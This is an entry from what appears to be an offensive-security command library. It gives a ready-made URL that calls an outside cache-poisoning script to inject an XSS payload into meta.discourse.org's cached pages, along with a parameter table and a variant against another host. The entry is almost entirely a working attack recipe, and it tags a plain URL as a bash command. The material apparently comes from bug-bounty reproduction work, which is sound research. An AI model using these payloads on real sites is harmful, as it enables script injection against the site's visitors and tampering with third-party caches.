---
data: >-
  https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
tags:
  - xss
  - cache-poisoning
type: command
executor: bash
platforms:
  - Web
id: a3df94e8-115d-4a5e-a169-a9a8e8aee757
created_at: '2025-12-13T09:00:34.551Z'
updated_at: '2025-12-13T09:00:34.551Z'
verified: false
validated: true
submitted: true
---
# Inject XSS via Cache Poisoning Script

## Command

```bash
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```

## Description

Accesses a PHP script to automate cache poisoning with specified URL, XSS payload, and cache duration, used in reproducing XSS via cache deception in Discourse.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | Target Discourse URL with cacheattack parameter | Yes |
| `payload` | Encoded XSS script to inject | Yes |
| `cache` | Duration in seconds to poison the cache (60) | Yes |

## Examples

### Basic Usage

```bash
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```

### Advanced Usage

```bash
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://example.com/?param&payload=%22%3E%3Cscript%3Eevil()%3C/script%3E&cache=120
```

## Expected Output

Displays the cached URL to open for triggering the poisoned response.

## Related

- [[commands/get-request-with-cache-deception]]
- [[procedures/Poison-Web-Cache-with-XSS-Payload]]
